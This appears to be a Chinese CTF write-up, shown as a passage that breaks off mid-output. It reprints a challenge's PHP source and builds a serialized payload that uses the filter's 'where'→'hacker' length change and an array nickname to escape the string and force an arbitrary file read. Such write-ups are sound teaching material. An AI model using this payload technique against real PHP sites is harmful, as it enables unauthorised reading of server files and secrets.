class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>); <span class="comment"># 反序列化, profile来自$user-&gt;show_profile($username);</span></span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>])); <span class="comment"># 读取文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>); <span class="comment"># 对用户名进行过滤</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>; <span class="comment"># 用来拼接sql查询语句,根据去查一个用户来查询相关信息</span></span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>); <span class="comment">#第67行</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125; <span class="comment">//select * from $this-&gt;table where username=&#x27;$username&#x27;</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># 构造正则匹配表达式</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure><p><code>update.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>捋一下可利用的点和逻辑:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">update.php中: 输入要修改的信息后, 形成数组$profile</span><br><span class="line">将$profile序列化处理为字符串,然后执行user类中的 update_profile 方法</span><br><span class="line">在执行时update_profile, $username 和 序列化的$profile 都需要经过 fileter的过滤:</span><br><span class="line">(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;) 都会被替换为 &#x27;hacker&#x27; (其中where被替换为hacker时字符串长度+1,这里想到了反序列化的字符串逃逸)</span><br><span class="line"></span><br><span class="line">过滤完之后, 在update_profile中执行父类mysql中的update方法,执行的sql语句为:</span><br><span class="line">&quot;UPDATE users(表名) SET profile = &quot;序列化且经过处理的profile字符串的值&quot; WHERE username=$username&quot;;</span><br><span class="line">将更新完的信息以序列化字符串的形式存入数据库users表</span><br><span class="line"></span><br><span class="line">现在定位到反序列化函数处profile.php中:</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line">if($profile  == null) &#123;</span><br><span class="line">header(&#x27;Location: update.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$profile = unserialize($profile); # 反序列化, profile来自$user-&gt;show_profile($username);</span><br><span class="line">$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">$email = $profile[&#x27;email&#x27;];</span><br><span class="line">$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); # 读取文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">首先通过user类的show_profile函数,通过用户名从数据库中查询并取出对应的序列化字符串</span><br><span class="line">对其进行反序列化,拆解为数组,包括$profile[&#x27;phone&#x27;];$profile[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;]</span><br><span class="line">其中会根据$profile[&#x27;photo&#x27;]的值去读取文件, 利用点在这里</span><br><span class="line">正常情况下,这个值来自于上传文件的文件名,不容易控制, 现在可以通过反序列化的字符串逃逸将这个值覆盖为我们希望读取的文件的文件名</span><br></pre></td></tr></table></figure><p>那么现在需要构造反序列化的字符串:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;s:1:&quot;a&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;s:1:&quot;a&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;a&quot; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;a&quot; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br></pre></td></tr></table></figure><p>现在还有一个问题,就是我们用来构造逃逸字符串的<code>nickname</code>有长度限制:</p><p>对<code>nickname</code>的长度限制使用数组来绕过 : <code>nickname[]=xxxxxxxxxxxxxxx</code> 这样以来检测其长度是会默认为1</p><p><img src="/images/buuctf-web2/image-20221023224746419.png" alt="image-20221023224746419"></p><p>下面开始构建字符串: (脚本在最后面)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#x27;nickname&#x27;][] = &quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;</span><br><span class="line">假设我们要读取 profile.php</span><br><span class="line"></span><br><span class="line">序列化成字符串,过滤前</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:35:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤后的字符串</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:35:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤前字符串反序列化</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(35) &quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot; &#125; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br><span class="line">过滤后字符串反序列化</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(35) &quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot; &#125; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br></pre></td></tr></table></figure><p>接下来利用过滤<code>where</code>时将其替换成<code>hacker</code>使其长度+1的性质来构造逃逸字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#x27;nickname&#x27;][] = wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;</span><br><span class="line">(35个where)</span><br><span class="line">替换前: 35*where(5) + 35(从where后的引号开始数至末尾)</span><br><span class="line">替换后: 35*hacker(6)</span><br><span class="line"></span><br><span class="line">序列化成字符串,过滤前</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:210:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤后的字符串</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:210:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤前字符串反序列化</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(210) &quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot; &#125; [&quot;photo&quot;]=&gt; string(39) 